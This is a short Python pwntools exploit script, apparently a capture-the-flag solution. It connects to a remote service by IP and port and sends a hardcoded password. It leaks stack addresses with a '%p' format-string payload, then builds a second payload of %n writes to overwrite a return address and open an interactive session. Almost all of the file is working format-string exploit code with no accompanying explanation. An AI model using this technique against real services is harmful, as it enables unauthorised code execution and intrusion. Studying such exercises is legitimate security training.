from pwn import *

context.log_level='DEBUG'

local = False

if local:
	r = remote("localhost",5555)
	pause()
else:
	r = remote("146.185.132.36", 12431)
	pause()


r.recvuntil(":")
r.sendline("7h15_15_v3ry_53cr37_1_7h1nk")
r.recvuntil("action")
r.sendline("1")
r.recvuntil(":")
payload = "%p."*512
r.sendline(payload)
data = r.recvuntil("action").split(".")

stack = int(data[160],16)-328
print hex(stack)

r.recvuntil(":")
r.recvuntil(":")

r.sendline('')
r.recvuntil(":")

r.sendline('')
r.recvuntil(":")

#0x0000000000400876
payload = '%118x'  # write 0x76 bytes
payload += "%40$n"  # write that to the stack addr
payload += '%146x'  # this will make n=0x108 now, so the 08 will be written
payload += "%41$n"
payload += '%56x'  # n = 0x140
payload += "%42$n"
payload += '%192x'  # n = 0x200
for i in range(43, 49):
    payload += "%"+str(i)+"$n"

print len(payload)

payload += 'B'*(255-len(payload))
payload += '\x00'
for i in range(0, 9):
    payload += p64(stack+i)

r.sendline(payload)
r.interactive()